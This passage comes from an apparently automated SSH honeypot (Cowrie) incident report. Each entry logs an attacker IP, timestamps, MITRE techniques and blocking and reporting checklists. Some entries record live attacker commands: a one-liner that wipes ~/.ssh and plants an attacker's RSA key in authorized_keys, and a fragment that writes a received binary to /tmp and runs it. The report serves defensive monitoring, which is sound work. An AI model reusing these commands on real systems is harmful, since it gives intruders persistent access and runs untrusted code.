>&6 && cat 0<&6 > /tmp/92uve7yKbu ; chmod +x /tmp/92uve7yKbu && /tmp/92uve7yKbu zcQC1XXTdlCYbZnANNyaY4Recd101wXKt7TKAdZrz3JQjGyQ3zDbgGyGSXDKdckB0bOu0wTdc81wV4N6kdwxwJRrmFNx03TWAd64stcCx3bEb16BdJLaNsCSaIFdeMt01BPVsbjKANZrz3NemGuZ3zrZl2, (WELF` |
| **TTPs (MITRE)** | T1078 · T1083 · T1105 · T1110.001 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:33:33` | `cowrie.session.connect` |
| `2026-07-01 12:33:33` | `cowrie.client.version` |
| `2026-07-01 12:33:34` | `cowrie.client.kex` |
| `2026-07-01 12:33:36` | `cowrie.login.failed` |
| `2026-07-01 12:33:37` | `cowrie.login.success` |
| `2026-07-01 12:33:38` | `cowrie.session.params` |
| `2026-07-01 12:33:38` | `cowrie.command.input` |
| `2026-07-01 12:33:41` | `cowrie.command.input` |
| `2026-07-01 12:33:41` | `cowrie.command.input` |
| `2026-07-01 12:33:42` | `cowrie.command.input` |
| `2026-07-01 12:33:42` | `cowrie.command.input` |
| `2026-07-01 12:33:42` | `cowrie.log.closed` |
| `2026-07-01 12:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.31.229[.]191` to AbuseIPDB if not already reported
- [ ] Block `118.31.229[.]191` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0596fea04221

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 12:42 |
| **Last Seen** | 2026-07-01 12:42 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:42:16` | `cowrie.session.connect` |
| `2026-07-01 12:42:17` | `cowrie.client.version` |
| `2026-07-01 12:42:17` | `cowrie.client.kex` |
| `2026-07-01 12:42:24` | `cowrie.login.success` |
| `2026-07-01 12:42:27` | `cowrie.session.params` |
| `2026-07-01 12:42:27` | `cowrie.command.input` |
| `2026-07-01 12:42:28` | `cowrie.log.closed` |
| `2026-07-01 12:42:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f06870f68ab5

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 12:42 |
| **Last Seen** | 2026-07-01 12:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:42:49` | `cowrie.session.connect` |
| `2026-07-01 12:42:50` | `cowrie.client.version` |
| `2026-07-01 12:42:50` | `cowrie.client.kex` |
| `2026-07-01 12:42:52` | `cowrie.login.success` |
| `2026-07-01 12:42:53` | `cowrie.session.params` |
| `2026-07-01 12:42:53` | `cowrie.command.input` |
| `2026-07-01 12:42:55` | `cowrie.log.closed` |
| `2026-07-01 12:42:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-124a539b585e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 12:53 |
| **Last Seen** | 2026-07-01 12:53 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:53:41` | `cowrie.session.connect` |
| `2026-07-01 12:53:42` | `cowrie.client.version` |
| `2026-07-01 12:53:42` | `cowrie.client.kex` |
| `2026-07-01 12:53:48` | `cowrie.login.success` |
| `2026-07-01 12:53:52` | `cowrie.session.params` |
| `2026-07-01 12:53:52` | `cowrie.command.input` |
| `2026-07-01 12:53:54` | `cowrie.log.closed` |
| `2026-07-01 12:53:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b31262544b4a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 12:56 |
| **Last Seen** | 2026-07-01 12:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 12:56:09` | `cowrie.session.connect` |
| `2026-07-01 12:56:09` | `cowrie.client.version` |
| `2026-07-01 12:56:10` | `cowrie.client.kex` |
| `2026-07-01 12:56:10` | `cowrie.login.success` |
| `2026-07-01 12:56:11` | `cowrie.session.params` |
| `2026-07-01 12:56:11` | `cowrie.command.input` |
| `2026-07-01 12:56:11` | `cowrie.log.closed` |
| `2026-07-01 12:56:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b83dffeadd0

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 13:00 |
| **Last Seen** | 2026-07-01 13:00 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:00:02` | `cowrie.session.connect` |
| `2026-07-01 13:00:02` | `cowrie.client.version` |
| `2026-07-01 13:00:02` | `cowrie.client.kex` |
| `2026-07-01 13:00:05` | `cowrie.login.success` |
| `2026-07-01 13:00:06` | `cowrie.session.params` |
| `2026-07-01 13:00:06` | `cowrie.command.input` |
| `2026-07-01 13:00:07` | `cowrie.log.closed` |
| `2026-07-01 13:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c8d7abd78c4e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 13:05 |
| **Last Seen** | 2026-07-01 13:05 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:05:31` | `cowrie.session.connect` |
| `2026-07-01 13:05:32` | `cowrie.client.version` |
| `2026-07-01 13:05:32` | `cowrie.client.kex` |
| `2026-07-01 13:05:39` | `cowrie.login.success` |
| `2026-07-01 13:05:42` | `cowrie.session.params` |
| `2026-07-01 13:05:42` | `cowrie.command.input` |
| `2026-07-01 13:05:43` | `cowrie.log.closed` |
| `2026-07-01 13:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97c280e74c23

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 13:16 |
| **Last Seen** | 2026-07-01 13:16 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:16:51` | `cowrie.session.connect` |
| `2026-07-01 13:16:52` | `cowrie.client.version` |
| `2026-07-01 13:16:52` | `cowrie.client.kex` |
| `2026-07-01 13:16:54` | `cowrie.login.success` |
| `2026-07-01 13:16:56` | `cowrie.session.params` |
| `2026-07-01 13:16:56` | `cowrie.command.input` |
| `2026-07-01 13:16:56` | `cowrie.log.closed` |
| `2026-07-01 13:16:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d90b0d867f6

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 13:17 |
| **Last Seen** | 2026-07-01 13:17 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:17:06` | `cowrie.session.connect` |
| `2026-07-01 13:17:08` | `cowrie.client.version` |
| `2026-07-01 13:17:08` | `cowrie.client.kex` |
| `2026-07-01 13:17:13` | `cowrie.login.success` |
| `2026-07-01 13:17:17` | `cowrie.session.params` |
| `2026-07-01 13:17:17` | `cowrie.command.input` |
| `2026-07-01 13:17:19` | `cowrie.log.closed` |
| `2026-07-01 13:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdad9c22df16

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 13:28 |
| **Last Seen** | 2026-07-01 13:29 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:28:54` | `cowrie.session.connect` |
| `2026-07-01 13:28:56` | `cowrie.client.version` |
| `2026-07-01 13:28:56` | `cowrie.client.kex` |
| `2026-07-01 13:29:02` | `cowrie.login.success` |
| `2026-07-01 13:29:06` | `cowrie.session.params` |
| `2026-07-01 13:29:06` | `cowrie.command.input` |
| `2026-07-01 13:29:07` | `cowrie.log.closed` |
| `2026-07-01 13:29:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-93e800f0334f

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-07-01 13:33 |
| **Last Seen** | 2026-07-01 13:33 |
| **Session Duration** | 37s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:33:01` | `cowrie.session.connect` |
| `2026-07-01 13:33:05` | `cowrie.client.version` |
| `2026-07-01 13:33:06` | `cowrie.client.kex` |
| `2026-07-01 13:33:09` | `cowrie.login.success` |
| `2026-07-01 13:33:13` | `cowrie.session.params` |
| `2026-07-01 13:33:13` | `cowrie.command.input` |
| `2026-07-01 13:33:13` | `cowrie.command.failed` |
| `2026-07-01 13:33:15` | `cowrie.log.closed` |
| `2026-07-01 13:33:18` | `cowrie.session.params` |
| `2026-07-01 13:33:18` | `cowrie.command.input` |
| `2026-07-01 13:33:18` | `cowrie.session.file_download` |
| `2026-07-01 13:33:18` | `cowrie.log.closed` |
| `2026-07-01 13:33:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fe5a3f5de568

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-01 13:33 |
| **Last Seen** | 2026-07-01 13:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:33:10` | `cowrie.session.connect` |
| `2026-07-01 13:33:10` | `cowrie.client.version` |
| `2026-07-01 13:33:10` | `cowrie.client.kex` |
| `2026-07-01 13:33:10` | `cowrie.login.success` |
| `2026-07-01 13:33:11` | `cowrie.session.params` |
| `2026-07-01 13:33:11` | `cowrie.command.input` |
| `2026-07-01 13:33:11` | `cowrie.log.closed` |
| `2026-07-01 13:33:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-555077f6449a

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-07-01 13:33 |
| **Last Seen** | 2026-07-01 13:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:33:20` | `cowrie.session.connect` |
| `2026-07-01 13:33:20` | `cowrie.client.version` |
| `2026-07-01 13:33:22` | `cowrie.client.kex` |
| `2026-07-01 13:33:24` | `cowrie.login.success` |
| `2026-07-01 13:33:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f1e749a6599c

| Field | Detail |
|---|---|
| **Source IP** | `69.5.20[.]232` |
| **First Seen** | 2026-07-01 13:33 |
| **Last Seen** | 2026-07-01 13:33 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:33:28` | `cowrie.session.connect` |
| `2026-07-01 13:33:29` | `cowrie.client.version` |
| `2026-07-01 13:33:30` | `cowrie.client.kex` |
| `2026-07-01 13:33:35` | `cowrie.login.success` |
| `2026-07-01 13:33:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `69.5.20[.]232` to AbuseIPDB if not already reported
- [ ] Block `69.5.20[.]232` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d77485f08b9

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-07-01 13:33 |
| **Last Seen** | 2026-07-01 13:33 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:33:49` | `cowrie.session.connect` |
| `2026-07-01 13:33:50` | `cowrie.client.version` |
| `2026-07-01 13:33:50` | `cowrie.client.kex` |
| `2026-07-01 13:33:52` | `cowrie.login.success` |
| `2026-07-01 13:33:53` | `cowrie.session.params` |
| `2026-07-01 13:33:53` | `cowrie.command.input` |
| `2026-07-01 13:33:54` | `cowrie.log.closed` |
| `2026-07-01 13:33:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68a69da986c8

| Field | Detail |
|---|---|
| **Source IP** | `20.228.193[.]165` |
| **First Seen** | 2026-07-01 13:36 |
| **Last Seen** | 2026-07-01 13:36 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:36:52` | `cowrie.session.connect` |
| `2026-07-01 13:36:52` | `cowrie.client.version` |
| `2026-07-01 13:36:52` | `cowrie.client.kex` |
| `2026-07-01 13:36:52` | `cowrie.login.success` |
| `2026-07-01 13:36:52` | `cowrie.session.params` |
| `2026-07-01 13:36:52` | `cowrie.command.input` |
| `2026-07-01 13:36:52` | `cowrie.command.failed` |
| `2026-07-01 13:36:52` | `cowrie.log.closed` |
| `2026-07-01 13:36:53` | `cowrie.session.params` |
| `2026-07-01 13:36:53` | `cowrie.command.input` |
| `2026-07-01 13:36:53` | `cowrie.session.file_download` |
| `2026-07-01 13:36:53` | `cowrie.log.closed` |
| `2026-07-01 13:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.228.193[.]165` to AbuseIPDB if not already reported
- [ ] Block `20.228.193[.]165` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6b1cc40c31bf

| Field | Detail |
|---|---|
| **Source IP** | `20.228.193[.]165` |
| **First Seen** | 2026-07-01 13:36 |
| **Last Seen** | 2026-07-01 13:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:36:53` | `cowrie.session.connect` |
| `2026-07-01 13:36:53` | `cowrie.client.version` |
| `2026-07-01 13:36:53` | `cowrie.client.kex` |
| `2026-07-01 13:36:53` | `cowrie.login.success` |
| `2026-07-01 13:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.228.193[.]165` to AbuseIPDB if not already reported
- [ ] Block `20.228.193[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d92ad532ca93

| Field | Detail |
|---|---|
| **Source IP** | `20.228.193[.]165` |
| **First Seen** | 2026-07-01 13:36 |
| **Last Seen** | 2026-07-01 13:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:36:53` | `cowrie.session.connect` |
| `2026-07-01 13:36:53` | `cowrie.client.version` |
| `2026-07-01 13:36:53` | `cowrie.client.kex` |
| `2026-07-01 13:36:53` | `cowrie.login.success` |
| `2026-07-01 13:36:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `20.228.193[.]165` to AbuseIPDB if not already reported
- [ ] Block `20.228.193[.]165` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94480e9f3943

| Field | Detail |
|---|---|
| **Source IP** | `116.41.81[.]52` |
| **First Seen** | 2026-07-01 13:37 |
| **Last Seen** | 2026-07-01 13:37 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, shell, enable, system, ping; sh` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:37:01` | `cowrie.session.connect` |
| `2026-07-01 13:37:04` | `cowrie.login.success` |
| `2026-07-01 13:37:05` | `cowrie.session.params` |
| `2026-07-01 13:37:06` | `cowrie.command.input` |
| `2026-07-01 13:37:06` | `cowrie.command.input` |
| `2026-07-01 13:37:06` | `cowrie.command.failed` |
| `2026-07-01 13:37:06` | `cowrie.command.input` |
| `2026-07-01 13:37:06` | `cowrie.command.failed` |
| `2026-07-01 13:37:06` | `cowrie.command.input` |
| `2026-07-01 13:37:06` | `cowrie.command.failed` |
| `2026-07-01 13:37:06` | `cowrie.command.input` |
| `2026-07-01 13:37:06` | `cowrie.command.input` |
| `2026-07-01 13:37:07` | `cowrie.command.input` |
| `2026-07-01 13:37:07` | `cowrie.command.success` |
| `2026-07-01 13:37:08` | `cowrie.log.closed` |
| `2026-07-01 13:37:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `116.41.81[.]52` to AbuseIPDB if not already reported
- [ ] Block `116.41.81[.]52` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6dcac6709c8a

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-01 13:40 |
| **Last Seen** | 2026-07-01 13:41 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:40:53` | `cowrie.session.connect` |
| `2026-07-01 13:40:55` | `cowrie.client.version` |
| `2026-07-01 13:40:55` | `cowrie.client.kex` |
| `2026-07-01 13:41:00` | `cowrie.login.success` |
| `2026-07-01 13:41:04` | `cowrie.session.params` |
| `2026-07-01 13:41:04` | `cowrie.command.input` |
| `2026-07-01 13:41:06` | `cowrie.log.closed` |
| `2026-07-01 13:41:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e65b08fd33ba

| Field | Detail |
|---|---|
| **Source IP** | `187.170.65[.]227` |
| **First Seen** | 2026-07-01 13:47 |
| **Last Seen** | 2026-07-01 13:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:47:20` | `cowrie.session.connect` |
| `2026-07-01 13:47:20` | `cowrie.client.version` |
| `2026-07-01 13:47:20` | `cowrie.client.kex` |
| `2026-07-01 13:47:21` | `cowrie.login.success` |
| `2026-07-01 13:47:21` | `cowrie.session.params` |
| `2026-07-01 13:47:21` | `cowrie.command.input` |
| `2026-07-01 13:47:21` | `cowrie.command.failed` |
| `2026-07-01 13:47:22` | `cowrie.log.closed` |
| `2026-07-01 13:47:22` | `cowrie.session.params` |
| `2026-07-01 13:47:22` | `cowrie.command.input` |
| `2026-07-01 13:47:23` | `cowrie.session.file_download` |
| `2026-07-01 13:47:23` | `cowrie.log.closed` |
| `2026-07-01 13:47:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.170.65[.]227` to AbuseIPDB if not already reported
- [ ] Block `187.170.65[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01a8eb05aa37

| Field | Detail |
|---|---|
| **Source IP** | `187.170.65[.]227` |
| **First Seen** | 2026-07-01 13:47 |
| **Last Seen** | 2026-07-01 13:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:47:23` | `cowrie.session.connect` |
| `2026-07-01 13:47:23` | `cowrie.client.version` |
| `2026-07-01 13:47:23` | `cowrie.client.kex` |
| `2026-07-01 13:47:23` | `cowrie.login.success` |
| `2026-07-01 13:47:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `187.170.65[.]227` to AbuseIPDB if not already reported
- [ ] Block `187.170.65[.]227` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-207ac6abd5f7

| Field | Detail |
|---|---|
| **Source IP** | `187.170.65[.]227` |
| **First Seen** | 2026-07-01 13:47 |
| **Last Seen** | 2026-07-01 13:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-01 13:47:23` | `cowrie.session.connect` |
